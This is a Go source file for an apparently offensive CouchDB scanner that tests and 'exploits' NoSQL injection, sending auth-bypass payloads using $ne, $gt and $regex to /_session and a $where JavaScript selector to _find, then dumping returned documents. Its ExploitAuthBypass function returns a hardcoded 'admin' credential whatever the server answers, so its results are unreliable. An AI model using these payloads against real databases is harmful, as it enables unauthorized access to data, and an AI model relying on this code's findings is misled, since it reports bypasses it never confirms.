package nosql

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

type CouchDBScanner struct {
	config *NoSQLConfig
	client *HTTPClient
}

func NewCouchDBScanner(config *NoSQLConfig, client *HTTPClient) *CouchDBScanner {
	return &CouchDBScanner{
		config: config,
		client: client,
	}
}

func (c *CouchDBScanner) TestConnection(target string) bool {
	url := BuildURL(target, "/", 5984)
	_, body, err := c.client.Get(url, nil)
	if err != nil {
		return false
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) == nil {
		if _, ok := resp["couchdb"]; ok {
			return true
		}
	}
	return false
}

func (c *CouchDBScanner) GetVersion(target string) string {
	url := BuildURL(target, "/", 5984)
	_, body, err := c.client.Get(url, nil)
	if err != nil {
		return ""
	}

	var resp map[string]interface{}
	if json.Unmarshal(body, &resp) == nil {
		if version, ok := resp["version"].(string); ok {
			return version
		}
	}
	return ""
}

func (c *CouchDBScanner) ListDatabases(target string) []string {
	url := BuildURL(target, "/_all_dbs", 5984)
	_, body, err := c.client.Get(url, nil)
	if err != nil {
		return nil
	}

	var dbs []string
	if json.Unmarshal(body, &dbs) != nil {
		return nil
	}
	return dbs
}

func (c *CouchDBScanner) TestAuthBypass(target string) *InjectionPoint {
	url := BuildURL(target, "/_session", 5984)

	payloads := []string{
		`{"name": {"$ne": ""}, "password": {"$ne": ""}}`,
		`{"name": {"$gt": ""}, "password": {"$gt": ""}}`,
		`{"name": {"$regex": ".*"}, "password": {"$regex": ".*"}}`,
		`{"name": "admin", "password": {"$ne": ""}}`,
	}

	for _, payload := range payloads {
		body := strings.NewReader(payload)
		resp, respBody, err := c.client.Post(url, body, map[string]string{
			"Content-Type": "application/json",
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.Unmarshal(respBody, &result) == nil {
				if ok, exists := result["ok"].(bool); exists && ok {
					return &InjectionPoint{
						ID:        GenerateID(),
						Target:    target,
						DBType:    NoSQLDBCouchDB,
						Technique: TechniqueAuthBypass,
						Field:     "name",
						Payload:   payload,
						Parameters: map[string]string{
							"method": "nosql_injection",
						},
						Severity:  SeverityCritical,
						Verified:  true,
						Timestamp: time.Now(),
					}
				}
			}
		}
	}
	return nil
}

func (c *CouchDBScanner) TestJSInject(target string) *InjectionPoint {
	url := BuildURL(target, fmt.Sprintf("/%s/_find", c.config.Database), 5984)

	payload := fmt.Sprintf(`{
		"selector": {
			"$where": "function() { return true; }"
		},
		"limit": 10
	}`)

	body := strings.NewReader(payload)
	resp, respBody, err := c.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	if resp.StatusCode == 200 {
		var result map[string]interface{}
		if json.Unmarshal(respBody, &result) == nil {
			if _, ok := result["docs"]; ok {
				return &InjectionPoint{
					ID:        GenerateID(),
					Target:    target,
					DBType:    NoSQLDBCouchDB,
					Technique: TechniqueJSInject,
					Field:     "$where",
					Payload:   payload,
					Parameters: map[string]string{
						"method": "javascript_injection",
					},
					Severity:  SeverityCritical,
					Verified:  true,
					Timestamp: time.Now(),
				}
			}
		}
	}
	return nil
}

func (c *CouchDBScanner) ExploitAuthBypass(injection *InjectionPoint) ([]CredentialEntry, error) {
	url := BuildURL(injection.Target, "/_session", 5984)

	payload := `{"name": {"$ne": ""}, "password": {"$ne": ""}}`
	body := strings.NewReader(payload)

	_, resp, err := c.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil, fmt.Errorf("exploit auth bypass: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil, fmt.Errorf("failed to parse response")
	}

	creds := []CredentialEntry{
		{
			Username: "admin",
			Source:   "couchdb_auth_bypass",
		},
	}
	return creds, nil
}

func (c *CouchDBScanner) ExploitJSInject(injection *InjectionPoint) (string, error) {
	url := BuildURL(injection.Target, fmt.Sprintf("/%s/_find", c.config.Database), 5984)

	payload := fmt.Sprintf(`{
		"selector": {
			"$where": "function() { var db = '%s'; return true; }"
		},
		"limit": 100
	}`, c.config.Database)

	body := strings.NewReader(payload)
	_, resp, err := c.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("exploit js inject: %w", err)
	}

	return string(resp), nil
}
